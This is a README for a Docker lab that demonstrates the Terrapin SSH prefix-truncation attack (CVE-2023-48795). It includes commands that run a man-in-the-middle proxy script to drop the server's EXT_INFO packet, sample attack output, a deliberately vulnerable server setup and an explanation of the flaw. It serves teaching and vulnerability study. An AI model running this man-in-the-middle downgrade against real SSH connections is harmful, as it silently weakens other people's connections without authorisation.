# Terrapin Attack - Manual Exploitation Lab

**CVE-2023-48795** - SSH Protocol Prefix Truncation Attack

![Status](https://img.shields.io/badge/Status-Ready-green) ![Docker](https://img.shields.io/badge/Docker-Required-blue)

---

## 📋 Quick Start

### 1. Build and Start Lab
```powershell
docker-compose up -d
```

Wait ~30 seconds for containers to start. Check status:
```powershell
docker-compose ps
```

You should see 3 containers running:
- `terrapin-vulnerable-server` - Vulnerable SSH server
- `terrapin-attacker` - MITM proxy
- `terrapin-client` - SSH client

---

## 🎯 Manual Exploitation (Step-by-Step)

### **OPTION 1: Two Terminal Method (See the Attack Live)**

#### Terminal 1 - Start MITM Proxy
```powershell
docker exec -it terrapin-attacker python3 /attack/manual_attack_demo.py
```

**Expected Output:**
```
============================================================
TERRAPIN ATTACK - MANUAL DEMONSTRATION
CVE-2023-48795
============================================================

[*] Starting proxy on port 2222
[*] Target: vulnerable-server:22

[*] Waiting for SSH client to connect...
```

#### Terminal 2 - Connect Through Proxy (Trigger Attack)
```powershell
docker exec -it terrapin-client ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 testuser@attacker
```

**Password:** `password123`

#### Watch Terminal 1 for Attack Success!
```
[+] Client connected from ('172.20.0.30', xxxxx)
[+] Connected to vulnerable-server:22

============================================================
MONITORING SSH HANDSHAKE...
============================================================

[INFO] Client->Server: SSH_MSG_NEWKEYS detected
[INFO] Server->Client: SSH_MSG_NEWKEYS detected

============================================================
🎯 ATTACK SUCCESS!
============================================================
[ATTACK] Dropping SSH_MSG_EXT_INFO packet from server!
[ATTACK] Packet size: XXX bytes
[ATTACK] This removes SSH security extensions
============================================================

✅ Attack successful! Dropped 1 EXT_INFO packet(s)
```

---

### **OPTION 2: Automated Attack Script**

Run the complete attack with one command:
```powershell
# Start proxy in background
docker exec -d terrapin-attacker python3 /attack/manual_attack_demo.py

# Wait 2 seconds, then connect
Start-Sleep -Seconds 2
docker exec -it terrapin-client ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 2222 testuser@attacker
```

Password: `password123`

---

## 🔍 Verify with Wireshark (Packet Analysis)

### Method 1: Capture Inside Attacker Container

#### Step 1: Start Packet Capture
```powershell
# Terminal 1 - Start capture
docker exec -d terrapin-attacker tcpdump -i eth0 -w /attack/captures/terrapin.pcap 'tcp port 22'
```

#### Step 2: Run the Attack
```powershell
# Terminal 2 - Start proxy
docker exec -it terrapin-attacker python3 /attack/manual_attack_demo.py
```

#### Step 3: Connect Client
```powershell
# Terminal 3 - Connect and trigger attack
docker exec -it terrapin-client ssh -o StrictHostKeyChecking=no -p 2222 testuser@attacker
# Password: password123
# Type 'exit' after logging in
```

#### Step 4: Stop Capture
```powershell
# Stop tcpdump
docker exec terrapin-attacker pkill tcpdump
```

#### Step 5: Copy and Analyze
```powershell
# Copy pcap file to your Windows machine
docker cp terrapin-attacker:/attack/captures/terrapin.pcap d:\Terrapin\captures\

# Open with Wireshark (install from https://www.wireshark.org/)
```

**In Wireshark:**
1. Open `captures\terrapin.pcap`
2. Apply filter: `ssh`
3. Look for SSH handshake packets
4. Find `SSH_MSG_NEWKEYS` (message type 21)
5. Notice **missing SSH_MSG_EXT_INFO** (message type 7) after NEWKEYS
6. This proves the attack dropped the security extension packet!

---

### Method 2: Real-Time Wireshark on Windows (Advanced)

If you want to see live traffic:

```powershell
# Install Wireshark on Windows first
# Then install npcap (bundled with Wireshark)

# Start Wireshark capture on Docker network interface
# Look for "vEthernet (WSL)" or Docker interface
# Apply filter: tcp.port == 2222 or tcp.port == 22

# Then run the attack as shown above
```

---

## 📊 Docker Verification

### Check Container Status
```powershell
docker-compose ps
```

### View Container Logs
```powershell
# Server logs
docker logs terrapin-vulnerable-server

# Attacker logs
docker logs terrapin-attacker

# Client logs
docker logs terrapin-client
```

### Inspect Network
```powershell
docker network inspect terrapin_terrapin-net
```

### Check Open Ports
```powershell
docker exec terrapin-vulnerable-server netstat -tulpn
docker exec terrapin-attacker netstat -tulpn
```

### Verify SSH Configuration
```powershell
# Check vulnerable ciphers are enabled
docker exec terrapin-vulnerable-server cat /etc/ssh/sshd_config | Select-String "Ciphers"

# Should show: chacha20-poly1305@openssh.com (vulnerable)
```

---

## 🧪 Additional Tests

### Test 1: Direct Connection (No Attack - Baseline)
```powershell
# Connect directly to server (bypass attacker)
docker exec -it terrapin-client ssh -o StrictHostKeyChecking=no testuser@vulnerable-server
# Password: password123

# This connection is NOT attacked - extensions are preserved
```

### Test 2: Compare Server Response
```powershell
# With attack (through proxy)
docker exec terrapin-client ssh -v -p 2222 testuser@attacker 2>&1 | Select-String "ext-info"

# Without attack (direct)
docker exec terrapin-client ssh -v testuser@vulnerable-server 2>&1 | Select-String "ext-info"
```

### Test 3: Vulnerability Check
```powershell
# Check which ciphers are supported
docker exec terrapin-client ssh -Q cipher
```

---

## 🔧 Troubleshooting

### Containers Not Running
```powershell
docker-compose down
docker-compose up -d
```

### Port Conflicts
Edit `docker-compose.yml` and change port mappings:
```yaml
ports:
  - "2222:22"  # Change 2222 to another port if busy
```

### Permission Issues
```powershell
# Reset containers
docker-compose down -v
docker-compose up -d
```

### View Live Attack Logs
```powershell
# Terminal 1
docker exec -it terrapin-attacker python3 /attack/manual_attack_demo.py

# This shows real-time packet manipulation
```

---

## 📖 Understanding the Attack

### What is Terrapin Attack?

The Terrapin attack (CVE-2023-48795) is a **prefix truncation attack** on the SSH protocol that exploits:
1. **ChaCha20-Poly1305 cipher** or **CBC with Encrypt-then-MAC**
2. **Sequence number manipulation** during handshake
3. **Missing integrity protection** for handshake packets

### Attack Flow

```
Client  <--->  Attacker (MITM)  <--->  Server
   |              |                      |
   |--- Hello --->|------- Hello ------->|
   |<-- Hello ----|<------ Hello --------|
   |              |                      |
   |-- KEXINIT -->|------ KEXINIT ------>|
   |<- KEXINIT ---|<----- KEXINIT -------|
   |              |                      |
   |-- NEWKEYS -->|------ NEWKEYS ------>|
   |<- NEWKEYS ---|<----- NEWKEYS -------|
   |              |                      |
   |              |<-- EXT_INFO ---------|
   |              |   [DROPPED! 🎯]      |
   |              |                      |
   |<- (nothing)--|                      |
```

### Impact

- ✅ SSH connection succeeds
- ❌ Security extensions removed
- ❌ No detection by client or server
- ❌ Downgraded security without warning

---

## 🎓 Educational Insights

### Why This Works

1. **No integrity protection**: SSH handshake packets aren't authenticated until after key exchange
2. **Sequence number trick**: Attacker drops packets, causing sequence number mismatch that SSH doesn't detect
3. **Backwards compatibility**: SSH continues even when extensions are missing

### Real-World Implications

- Affects OpenSSH, PuTTY, libssh, and many other implementations
- Can disable security features like server-signature algorithms
- Silent downgrade attack - no warnings shown
- Fixed in OpenSSH 9.6+ via "strict KEX" mechanism

---

## 📁 Repository Structure

```
terrapin/
├── README.md                    # This file - complete guide
├── docker-compose.yml          # Lab environment setup
├── manual_attack_demo.py       # Simplified attack script
├── attacker/
│   ├── Dockerfile
│   └── tools/
├── vulnerable_server/
│   ├── Dockerfile
│   ├── sshd_config            # Vulnerable SSH config
│   └── setup.sh
├── client/
│   ├── Dockerfile
│   └── test_client.py
├── poc_exploit/               # Advanced exploit code
│   ├── terrapin_exploit.py
│   └── requirements.txt
└── captures/                  # Wireshark pcap files go here
```

---

## 🛑 Stop the Lab

```powershell
# Stop containers
docker-compose down

# Remove everything (including volumes)
docker-compose down -v
```

---

## ⚠️ Legal Disclaimer

This lab is for **educational purposes only**. 

- Only use on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- This demonstrates a real vulnerability for learning purposes
- The maintainers are not responsible for misuse

---

## 📚 References

- **CVE:** CVE-2023-48795
- **Paper:** https://terrapin-attack.com/
- **OpenSSH Security Advisory:** https://www.openssh.com/txt/release-9.6
- **CVSS Score:** 5.9 (Medium)

---

## ✅ Quick Command Reference

```powershell
# Start lab
docker-compose up -d

# Manual attack (2 terminals)
# Terminal 1:
docker exec -it terrapin-attacker python3 /attack/manual_attack_demo.py
# Terminal 2:
docker exec -it terrapin-client ssh -o StrictHostKeyChecking=no -p 2222 testuser@attacker

# Capture packets
docker exec -d terrapin-attacker tcpdump -i eth0 -w /attack/captures/attack.pcap 'tcp port 22'
docker cp terrapin-attacker:/attack/captures/attack.pcap ./captures/

# View logs
docker logs terrapin-vulnerable-server
docker logs terrapin-attacker

# Stop lab
docker-compose down
```

---

**Status:** ✅ Ready to exploit
**Difficulty:** Easy
**Time Required:** 5 minutes

Happy learning! 🎯
